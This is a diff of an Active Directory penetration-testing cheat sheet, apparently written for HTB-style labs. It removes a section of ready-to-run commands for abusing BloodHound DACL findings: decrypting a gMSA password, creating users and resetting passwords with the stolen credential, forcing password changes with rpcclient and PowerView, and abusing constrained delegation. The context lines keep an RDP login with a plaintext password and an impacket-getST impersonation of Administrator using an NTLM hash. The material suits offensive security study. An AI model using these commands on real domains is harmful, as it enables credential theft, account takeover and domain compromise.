@@ -21,44 +21,6 @@ Using netexec:
 ### <ins>RDP to host using xfreerdp</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
 
-# <ins>BloodHound Dacls Abuse</ins>
-
-### GMSAPasswordReader
-
-Decrypt the gmsa password
-
-    1. $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties msDS-ManagedPassword
-    2. $mp = $gmsa.'msDS-ManagedPassword'
-    $mp // Get the password in numbers
-    3. ConvertFrom-ADManagedPasswordBlob $mp
-
-If the clear-text password not appear, let's just use it.
-
-    1. $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
-    2. $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password
-
-Now we got the credentials Objects, let's open a new session with the privileged user:
-
-    1. Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
-    2. Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
-
-### ForceChangePassword
-
-This Dacl means we can change the user's password without knowing his current one.
-
-Abuse it using rpcclient:
-
-    1. rpcclient -U <username> <ip>
-    2. setuserinfo2 <username-we-can-change-password-to> 23 'NewPassword123!'
-
-Change it using PowerView:
-
-    1. $newpass = ConverTo-SecureString 'Password1234!' -AsPlainText -Force
-    2. SetDomainPassword -Identity smith -AccountPassword $newpass
-
-### AllowsToDelegate
-The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer.
-
 Abuse:
 
     1. impacket-getST.py -spn cifs/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9
